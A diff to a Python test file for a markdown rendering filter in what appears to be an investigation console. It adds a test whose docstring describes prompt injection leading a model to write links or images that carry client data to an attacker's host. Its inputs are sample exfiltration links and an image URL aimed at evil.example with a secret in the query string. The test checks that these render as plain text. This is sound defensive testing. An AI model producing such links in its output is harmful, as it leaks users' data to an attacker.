@@ -355,8 +355,7 @@ def test_reports_render_as_markdown_with_raw_html_escaped() -> None:
     links = str(
         md("[x](javascript:alert(1)) [y](data:text/html,hi) [z](https://grafana.example/d)")
     )
-    assert 'href="javascript' not in links and 'href="data' not in links
-    assert '<a href="https://grafana.example/d">z</a>' in links
+    assert "<a" not in links and "[z](https://grafana.example/d)" in links
     assert str(md(None)) == ""
 
 
@@ -377,3 +376,17 @@ def test_an_investigation_page_renders_its_report() -> None:
     assert "<strong>Root cause</strong>" in html and "<li>" in html
     assert "<img" not in html and 'href="javascript' not in html
     assert '<span class="badge done">done</span>' in html
+
+
+def test_model_text_never_becomes_a_link_or_an_image() -> None:
+    """A prompt injection can make the model write a link or image carrying client
+    data to its own host: in the console it stays text, never clickable or loaded."""
+    md = TEMPLATES.filters["md"]
+    for text in (
+        "[docs](https://evil.example/?d=SECRET)",
+        "![x](https://evil.example/p.png?d=SECRET)",
+        "<https://evil.example/?d=SECRET>",
+        "[docs][1]\n\n[1]: https://evil.example/?d=SECRET",
+    ):
+        html = str(md(text))
+        assert "<a" not in html and "<img" not in html and "evil.example" in html, text
